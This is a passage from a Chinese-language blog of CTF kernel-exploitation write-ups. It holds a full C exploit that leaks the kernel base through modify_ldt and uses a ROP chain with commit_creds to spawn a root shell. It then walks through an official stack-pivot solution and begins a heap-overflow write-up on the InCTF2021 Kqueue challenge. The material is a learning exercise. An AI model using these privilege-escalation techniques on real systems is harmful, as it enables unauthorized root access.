class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x180_pop_3_ret 0xffffffff815141ae</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff8108c420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00fb0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810c9540</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810c99d0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_2_ret 0xffffffff810006a6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret_gadget 0xffffffff810001fc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_2_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr;</span><br><span class="line"><span class="keyword">int</span> offsets;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x1000</span>];</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line">    <span class="comment">// size_t addr=page_offset_base;</span></span><br><span class="line">    <span class="comment">// *(size_t *)buf1=addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;0x200;i++)&#123;</span></span><br><span class="line">    <span class="comment">//     chunk_edit(0,buf1);</span></span><br><span class="line">    <span class="comment">//     int ret=syscall(SYS_modify_ldt,0,buf2,0x1000);</span></span><br><span class="line">    <span class="comment">//     if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//         printf(&quot;write again fail\n&quot;);</span></span><br><span class="line">    <span class="comment">//         continue;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     for(int j=0;j&lt;0x1000/8;j++)&#123;</span></span><br><span class="line">    <span class="comment">//         size_t content=*((size_t *)buf2+j);</span></span><br><span class="line">    <span class="comment">//         if((content&amp;0xffffffff00000000)==0xffffffff00000000)&#123;</span></span><br><span class="line">    <span class="comment">//             if((content&amp;0xffffffff)!=0xffffffff)&#123;</span></span><br><span class="line">    <span class="comment">//                 printf(&quot;kernel_addr:%p  content:%p\n&quot;,addr+8*j,*((size_t *)buf2+j));</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">                </span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     addr+=0x1000;</span></span><br><span class="line">    <span class="comment">//     *(size_t *)buf1=addr;</span></span><br><span class="line">    <span class="comment">//     memset(buf2,0,0x1000);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base+<span class="number">0x9d000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x1000</span>);</span><br><span class="line">    kernel_base=*(<span class="keyword">size_t</span> *)buf2<span class="number">-0x40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    chunk_add(<span class="number">0x20</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">1</span>);</span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    add_rsp_0x180_pop_3_ret_addr=add_rsp_0x180_pop_3_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base+<span class="number">0xe</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// read(seq_fd,buf1,0x200);</span></span><br><span class="line">    usr_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h2><p>十分巧妙的解法，学到了很多。</p>
<p>官方前期的地址爆破和我大差不差，但在后面对<code>seq_operations</code>的<code>start</code>指针的利用开始不一样了，由于只开了<code>kpti</code>和<code>smep</code>，所以在内核态还是可以访问用户态数据的，所以可以在用户态布置内核rop然后在内核态直接把sp寄存器迁移到用户态。</p>
<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>那么问题来了，怎么利用一个函数指针让rsp指向自己布置在内核态的rop呢，官方解法里给出了一个十分巧妙（至少我第一次见）的方法，就是利用以下gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg_eax_esp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>xchg就是互换两个寄存器的数据，一般函数指针都是先加载到rax寄存器中然后再<code>call rax</code>的，所以执行<code>xchg eax, esp</code>的时候rax就指向这个gadget的地址，这个gadget的地址是可控的，但是可惜是内核地址，但是注意这个gadget只是交换寄存器的后32位，交换完后的esp就落到了用户态了，随意我们只要<code>mmap(xchg_eax_esp &amp; 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code>就可以把rsp指向用户态了。</p>
<p>官解在布置rop的时候没有重新设置<code>cr3</code>的值，也就是没有更换页表，所以最后返回用户态之后执行指令肯定会爆段错误，官解是这样处理的,他设置了段错误的处理函数，这样在发生了段错误以后，重新陷入内核态，然后内核态自动切换到用户态然后执行处理函数<code>spawn_shell</code>，这样就可以不用我们布置但是完美的返回到了用户态并执行用户态指令了。</p>
<p>但是直接布置<code>swapgs_restore_regs_and_return_to_usermode</code>使用的内存其实差不多的，嘿嘿，可以用但是没必要。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGSEGV, spawn_shell);</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这道题也是学到了很多，更加熟悉用户态页表和内核态页表的隔离机制了，比如开了kpti但是不开smep在内核态时其实和开了没有差别，但是开了kpti开不开smap差别还是挺大的。</p>
<p>然后是对<code>swapgs_restore_regs_and_return_to_usermode</code>的理解，在学习<code>ret2dir</code>的时候我不理解为什么交换了页表之后还是可以继续执行<code>swapgs_restore_regs_and_return_to_usermode</code>,通过<code>mit6.s081</code>的学习，能这样做的唯一解法就是这个函数在用户态和内核态都进行了映射，然后映射的虚拟地址是一模一样的，也佐证了用户态页表映射了少量的内核态地址。</p>
<p>这道题在爆破到内核地址后就是比较简单了，原因是没有开<code>pt_regs</code>的偏移和<code>smap</code>,假如这两个都开了的话，目前我能想到的解法就是利用<code>ret2dir</code>进行rop了，这样会比较麻烦。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/kernelpwn-%E5%86%8D%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/26/kernelpwn-%E5%86%8D%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">kernelpwn 再入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-26 17:58:24" itemprop="dateCreated datePublished" datetime="2022-07-26T17:58:24+08:00">2022-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-29 23:29:51" itemprop="dateModified" datetime="2022-07-29T23:29:51+08:00">2022-07-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>之前学习过一会kernelpwn,但感觉学习的不是很深入很扎实，导致现在好多东西也都忘了，那就再入门一次吧。</p>
<h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap-overflow"></a>heap-overflow</h2><p>就像用户态的堆溢出可以进行漏洞利用，同样的内核态的上堆溢出也可以进行漏洞利用，内核态的堆是通过slub/slab进行管理的，他把空闲队列以链表的形式组织，所以在我现在认为堆溢出一共有两种利用方式，一种是通过溢出覆盖下一个堆的next来达到任意地址申请，另一种是<code>heap spray</code>,我们可以利用内核本身的一些结构体，这些结构体里有函数指针，通过溢出可以覆盖到函数指针，进而进行rip的劫持。</p>
<h3 id="例题：InCTF2021-Kqueue"><a href="#例题：InCTF2021-Kqueue" class="headerlink" title="例题：InCTF2021 - Kqueue"></a>例题：InCTF2021 - Kqueue</h3><p><strong>启动脚本</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-cpu kvm64 \</span><br><span class="line">-m 512 \</span><br><span class="line">-nographic \</span><br><span class="line">-kernel  ./bzImage \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-net user \</span><br><span class="line">-net nic</span><br></pre></td></tr></table></figure>

<p>通过脚本可知cpu使用了kvm进行虚拟，虚拟机开了kaslr,没开kpti</p>
<p><strong>文件系统启动脚本</strong></p>
<p>由于题目的文件系统由buildroot构建，我不是很懂，所以换了个文件系统，不影响做题，就是加载完自写内核模块然后设置权限。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot;</span> | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/kqueue</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p><strong>内核模块</strong></p>
<p>题目直接给了源码，可以直接阅读源码，通过阅读源码可以逆出这个ko模块在内核实现了一种队列管理（私以为不是很写的不是很高效），这是<code>ioctl()</code>函数源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">kqueue_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">request_t</span> request;</span><br><span class="line">    </span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="keyword">void</span> *)&amp;request, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="keyword">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入不同的cmd执行不同的函数，这些函数看到函数名就能知道是干啥的，非常奇怪的是他会对传入的<code>request</code>结构体进行检查，如果不符合要求就会执行<code>err</code>函数，但是这个函数不会exit()，所以检查相当于没检查.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">err</span><span class="params">(<span class="keyword">char</span>* msg)</span></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中比较重要的就是<code>create_kqueue()</code>函数和<code>save_kqueue_entries()</code>函数</p>
